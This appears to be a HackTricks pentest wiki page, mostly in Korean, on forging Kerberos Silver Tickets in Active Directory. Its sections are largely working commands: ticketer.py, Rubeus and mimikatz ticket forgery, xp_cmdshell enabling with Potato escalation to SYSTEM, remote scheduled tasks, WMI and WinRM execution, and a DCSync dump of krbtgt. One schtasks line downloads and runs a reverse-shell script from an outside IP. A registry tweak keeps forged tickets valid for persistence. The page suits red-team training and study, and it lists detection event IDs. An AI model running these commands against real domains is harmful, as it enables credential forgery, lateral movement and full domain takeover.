# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 공격은 Active Directory (AD) 환경에서 서비스 티켓을 악용하는 기법입니다. 이 방법은 컴퓨터 계정과 같은 서비스 계정의 **NTLM 해시를 획득**하여 Ticket Granting Service (TGS) 티켓을 위조하는 것에 기반합니다. 이렇게 위조된 티켓을 통해 공격자는 네트워크의 특정 서비스에 접근하여 일반적으로 관리자 권한을 목표로 **임의의 사용자를 가장**할 수 있습니다. 티켓 위조에 AES 키를 사용하는 것이 더 안전하고 탐지가 더 어렵다는 점이 강조됩니다.

> [!WARNING]
> Silver Tickets는 Golden Tickets보다 탐지가 덜합니다. 그 이유는 krbtgt 계정이 아니라 서비스 계정의 **해시**만 필요하기 때문입니다. 그러나 Silver Tickets는 대상이 되는 특정 서비스로만 제한됩니다. 또한 단순히 사용자의 비밀번호를 훔치는 것만으로도 가능합니다.  
> 더 나아가, 만약 **SPN을 가진 계정의 비밀번호**를 탈취하면 그 비밀번호를 사용해 해당 서비스에 대해 어떤 사용자로든 가장하는 Silver Ticket을 생성할 수 있습니다.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows에서
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
The CIFS 서비스는 피해자의 파일 시스템에 접근하기 위한 일반적인 타깃으로 강조되지만, HOST나 RPCSS 같은 다른 서비스도 작업 및 WMI 쿼리 수행에 악용될 수 있습니다.

### 예시: MSSQL 서비스 (MSSQLSvc) + Potato로 SYSTEM

SQL 서비스 계정(예: sqlsvc)의 NTLM 해시(또는 AES 키)를 가지고 있다면 MSSQL SPN에 대한 TGS를 위조하여 SQL 서비스에 대해 임의의 사용자로 가장할 수 있습니다. 그 이후에 xp_cmdshell을 활성화하면 SQL 서비스 계정 권한으로 명령을 실행할 수 있습니다. 해당 토큰에 SeImpersonatePrivilege가 있다면 Potato를 이용해 SYSTEM으로 권한 상승을 시도할 수 있습니다.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 결과 컨텍스트에 SeImpersonatePrivilege (종종 service accounts에 해당)가 있으면, SYSTEM을 얻기 위해 Potato variant를 사용하세요:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL 남용 및 xp_cmdshell 활성화에 대한 자세한 내용:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques 개요:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 사용 가능한 서비스

| Service Type                               | 서비스 Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS에 따라 추가로:</p><p>WSMAN</p><p>RPCSS</p>    |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>경우에 따라 단순히 요청할 수도 있습니다: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**를 사용하면 다음 파라미터로 이러한 티켓을 모두 요청할 수 있습니다:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 이벤트 ID

- 4624: 계정 로그온
- 4634: 계정 로그오프
- 4672: 관리자 로그온

## Persistence

머신이 30일마다 암호를 갱신하지 않도록 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`로 설정하거나, 머신 암호의 회전 주기를 더 길게 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`를 30일보다 큰 값으로 설정할 수 있습니다.

## Service tickets 악용

다음 예에서는 티켓이 administrator 계정을 사칭하여 획득되었다고 가정합니다.

### CIFS

이 티켓으로 **SMB**를 통해 원격의 `C$` 및 `ADMIN$` 폴더(노출된 경우)에 접근할 수 있으며, 원격 파일시스템의 일부로 파일을 복사할 수 있습니다. 예:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
또한 **psexec**를 사용하여 호스트 내부에서 셸을 얻거나 임의의 명령을 실행할 수 있습니다:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### 호스트

이 권한으로 원격 컴퓨터에 예약된 작업을 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이 티켓들로 **피해자 시스템에서 WMI를 실행할 수 있습니다**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
다음 페이지에서 **wmiexec에 대한 자세한 정보**를 확인하세요:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

컴퓨터에 대한 winrm 접근 권한이 있으면 **접속할 수 있으며** 심지어 PowerShell을 얻을 수 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
다음 페이지를 확인하여 원격 호스트에 연결하는 **winrm을 사용한 추가 방법**을 알아보세요:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 원격 컴퓨터에 접근하려면 **winrm이 활성화되어 수신 대기 중이어야 합니다**.

### LDAP

이 권한으로 **DCSync**를 사용하여 DC 데이터베이스를 덤프할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync에 대해 자세히 알아보세요** 다음 페이지에서:


{{#ref}}
dcsync.md
{{#endref}}


## 참고자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
